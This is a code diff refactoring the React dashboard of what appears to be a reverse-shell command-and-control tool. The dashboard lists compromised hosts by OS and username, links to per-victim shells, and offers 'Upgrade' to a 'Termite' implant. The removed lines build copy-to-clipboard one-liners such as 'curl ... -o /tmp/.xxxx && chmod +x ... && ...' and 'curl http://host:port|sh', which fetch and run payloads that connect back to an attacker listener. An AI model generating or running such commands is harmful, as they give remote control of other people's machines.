@@ -1,38 +1,18 @@
 import React from "react";
 import {
-  Alert,
-  Button,
-  Collapse,
-  Descriptions,
-  Divider,
-  Input,
   Layout,
-  List,
   message,
-  Modal,
-  Progress,
-  Select,
-  Table,
-  Tabs,
-  Tag,
-  Tooltip,
 } from "antd";
 
 import Banner from "./components/Banner/Banner";
 import SideBar from "./components/SideBar/SideBar";
+import ClientsBody from "./components/Body/ClientsBody";
 
 import "./App.css";
-import { CopyToClipboard } from "react-copy-to-clipboard";
 
-const { Panel } = Collapse;
 const axios = require("axios");
-axios.defaults.headers.post["Content-Type"] =
-  "application/x-www-form-urlencoded";
-const { TabPane } = Tabs;
-const { Option } = Select;
-const moment = require("moment");
+axios.defaults.headers.post["Content-Type"] = "application/x-www-form-urlencoded";
 var W3CWebSocket = require("websocket").w3cwebsocket;
-var randomstring = require("randomstring");
 var filesize = require("filesize");
 
 message.config({
@@ -41,7 +21,6 @@ message.config({
   rtl: true,
 });
 
-const { Content } = Layout;
 
 let endPoint = process.env.NODE_ENV === "development" ? "192.168.88.129:7331" : window.location.host;
 let baseUrl = ["http://", endPoint].join("");
@@ -61,8 +40,14 @@ class App extends React.Component {
       serverCreateHost: "0.0.0.0",
       serverCreatePort: Math.floor(Math.random() * 65536),
     };
-    this.serverCreated = this.serverCreated.bind(this);
+    this.generateProgressStatus = this.generateProgressStatus.bind(this);
+    this.handleCancel = this.handleCancel.bind(this);
+    this.handleOk = this.handleOk.bind(this);
     this.selectServer = this.selectServer.bind(this);
+    this.serverCreated = this.serverCreated.bind(this);
+    this.setConnectBack = this.setConnectBack.bind(this);
+    this.setCopied = this.setCopied.bind(this);
+    this.showModal = this.showModal.bind(this);
   }
 
   upgradeToTermite(clientHash, target) {
@@ -282,257 +267,15 @@ class App extends React.Component {
     });
   }
 
+  setConnectBack(value) {
+    this.setState({ connectBack: value });
+  }
+
+  setCopied() {
+    this.setState({ copied: true })
+  }
+
   render() {
-    const columns = [
-      {
-        title: "Address",
-        dataIndex: "host",
-        key: "host",
-        align: "center",
-        render: (data, line, index) => {
-          return (
-            <Tooltip title={"Hash:" + line.hash}>
-              <span>{line.host + ":" + line.port}</span>
-            </Tooltip>
-          );
-        },
-      },
-      {
-        title: "OS",
-        dataIndex: "os",
-        key: "os",
-        align: "center",
-        render: (data) => {
-          switch (data) {
-            case 1:
-              return "Linux";
-            case 2:
-              return "Windows";
-            case 3:
-              return "SunOS";
-            case 4:
-              return "MacOS";
-            case 5:
-              return "FreeBSD";
-            default:
-              return "Unknown Operating System";
-          }
-        },
-      },
-      {
-        title: "Username",
-        dataIndex: "user",
-        key: "user",
-        align: "center",
-        render: (data) => {
-          let color = "green";
-          if (data === "root") {
-            color = "red";
-          }
-          return <Tag color={color}>{data}</Tag>;
-        },
-      },
-      {
-        title: "Online Time",
-        dataIndex: "timestamp",
-        key: "timestamp",
-        align: "center",
-        render: (data) => {
-          return "Onlined at " + moment(data).fromNow();
-        },
-      },
-      {
-        title: "Action",
-        key: "x",
-        render: (data, line, index) => {
-          let upgradeButton;
-          if (line.CurrentProcessKey === undefined) {
-            upgradeButton = <Button disabled={false} onClick={() => { this.showModal() }}>Upgrade</Button>
-          } else {
-            upgradeButton = ""
-          }
-
-          return (
-            <>
-              <Button>
-                <a
-                  href={baseUrl + "/shell/?" + line.hash}
-                  target={"_blank"}
-                  rel={"noreferrer noopener"}
-                >
-                  Shell
-                </a>
-              </Button>
-              {upgradeButton}
-              <Modal title="Basic Modal" visible={this.state.isModalVisible} onOk={() => this.handleOk(line.hash)} onCancel={() => this.handleCancel()}>
-                Select Termite Listeners:
-                <Select
-                  showSearch
-                  style={{ width: 200 }}
-                  placeholder="Select an termite listener"
-                  optionFilterProp="children"
-                  onChange={(value) => {
-                    this.setState({ connectBack: value });
-                  }}
-                  filterOption={(input, option) =>
-                    option.children.toLowerCase().indexOf(input.toLowerCase()) >= 0
-                  }
-                  defaultValue={this.state.connectBack}
-                >
-                  {this.state.serversList.map((entry) => {
-                    if (entry.encrypted) {
-                      return entry.interfaces.map((ifaddr) => {
-                        let v = ifaddr + ":" + entry.port
-                        return <Option value={v}>{v}</Option>
-                      })
-                    }
-                    return ""
-                  })}
-                </Select>
-                Input Termite Listeners Manually:
-                <Input placeholder="1.3.3.7:13337" value={this.state.connectBack} onChange={(e) => { this.setState({ connectBack: e.target.value }) }} />
-              </Modal>
-            </>
-          );
-        },
-      },
-      {
-        title: "Progress",
-        dataIndex: "upload_progress",
-        key: "upload_progress",
-        align: "center",
-        render: (data, line, index) => {
-          return <>
-            <Alert message={line.alert === undefined ? "Press Upgrade to Proceed" : line.alert} type="success" />
-            <Progress percent={line.compiling_progress} size="small" status={this.generateProgressStatus(line.compiling_progress)} />
-            <Progress percent={line.compressing_progress} size="small" status={this.generateProgressStatus(line.compressing_progress)} />
-            <Progress percent={Math.round(line.upload_progress)} size="small" status={this.generateProgressStatus(line.upload_progress)} />
-          </>
-        },
-      }
-    ];
-
-    let hint;
-    if (this.state.currentServer === null) {
-      hint = (
-        <Alert
-          message="Warning"
-          description="Please start and select a server"
-          type="warning"
-          showIcon
-          closable
-        />
-      );
-    } else {
-      let hintTabs
-      if (this.state.currentServer.encrypted) {
-        hintTabs = <Tabs defaultActiveKey="0">
-          {this.state.distributor.interfaces.map((value, index) => {
-            let url = "http://" + value + ":" + this.state.distributor.port
-            let command, filename, target
-            let data = []
-            Object.values(this.state.currentServer.interfaces).map((value, index) => {
-              filename = "/tmp/." + randomstring.generate(4)
-              target = value + ":" + this.state.currentServer.port
-              command = "curl -fsSL " + url + "/termite/" + target + " -o " + filename + " && chmod +x " + filename + " && " + filename
-              data.push({ target: value + ":" + this.state.currentServer.port, command: command })
-              return command
-            })
-
-            let commands = <List
-              size="small"
-              header={<div>Termite oneline command</div>}
-              footer={<div></div>}
-              bordered
-              dataSource={data}
-              renderItem={item => <List.Item>
-                {"Connect back: " + item.target}
-                <Input addonAfter={<CopyToClipboard
-                  text={item.command}
-                  onCopy={() => this.setState({ copied: true })}
-                >
-                  <button>Click to copy</button>
-                </CopyToClipboard>
-                } defaultValue={item.command} />
-              </List.Item>}
-            />
-
-            return (
-              <TabPane tab={value} key={index}>
-                {commands}
-              </TabPane>
-            );
-          })}
-        </Tabs>
-      } else {
-        hintTabs = <Tabs defaultActiveKey="0">
-          {this.state.currentServer.interfaces.map((value, index) => {
-            let command = "curl http://" + value + ":" + this.state.currentServer.port + "|sh"
-            return (
-              <TabPane tab={value} key={index}>
-                <Tag>{command}</Tag>
-                <CopyToClipboard
-                  text={command}
-                  onCopy={() => this.setState({ copied: true })}
-                >
-                  <button>Click to copy</button>
-                </CopyToClipboard>
-              </TabPane>
-            );
-          })}
-        </Tabs>
-      }
-      hint = (
-        <div>
-          <Descriptions title="Server Info">
-            <Descriptions.Item label="Address">
-              {this.state.currentServer.host +
-                ":" +
-                this.state.currentServer.port}
-            </Descriptions.Item>
-            <Descriptions.Item label="Clients">
-              {this.state.currentServer
-                ? Object.keys(this.state.currentServer.clients).length + Object.keys(this.state.currentServer.termite_clients).length
-                : 0}
-            </Descriptions.Item>
-            <Descriptions.Item label="Started">
-              {moment(this.state.currentServer.timestamp).fromNow()}
-            </Descriptions.Item>
-          </Descriptions>
-          <Collapse defaultActiveKey={["1"]}>
-            <Panel
-              header="Expand to show the reverse shell commands for the current server"
-              key="1"
-            >
-              {hintTabs}
-            </Panel>
-          </Collapse>
-        </div>
-      );
-    }
-
-    let dataSource;
-    let table;
-    if (this.state.currentServer) {
-      if (this.state.currentServer.encrypted) {
-        dataSource = Object.values(this.state.currentServer.termite_clients)
-        table = <Table
-          columns={columns.slice(0, columns.length - 1)}
-          pagination={{ position: [this.state.bottom] }}
-          dataSource={dataSource}
-        />
-      } else {
-        dataSource = Object.values(this.state.currentServer.clients)
-        table = <Table
-          columns={columns}
-          pagination={{ position: [this.state.bottom] }}
-          dataSource={dataSource}
-        />
-      }
-    } else {
-      dataSource = []
-    }
-
     return (
       <Layout>
         <Banner></Banner>
@@ -547,13 +290,21 @@ class App extends React.Component {
             serversList={this.state.serversList}
             serversMap={this.state.serversMap}
           />
-          <Layout style={{ padding: "0 24px 24px" }}>
-            <Content style={{ margin: "0 0" }}>
-              {hint}
-              <Divider orientation="left"></Divider>
-              {table}
-            </Content>
-          </Layout>
+          <ClientsBody
+            baseUrl={baseUrl}
+            currentServer={this.state.currentServer}
+            distributor={this.state.distributor}
+            bottom={this.state.bottom}
+            connectBack={this.state.connectBack}
+            currentServer={this.state.currentServer}
+            handleCancel={this.handleCancel}
+            handleOk={this.handleOk}
+            isModalVisible={this.state.isModalVisible}
+            serversList={this.state.serversList}
+            setConnectBack={this.setConnectBack}
+            showModal={this.showModal}
+            generateProgressStatus={this.generateProgressStatus}
+          />
         </Layout>
       </Layout>
     );
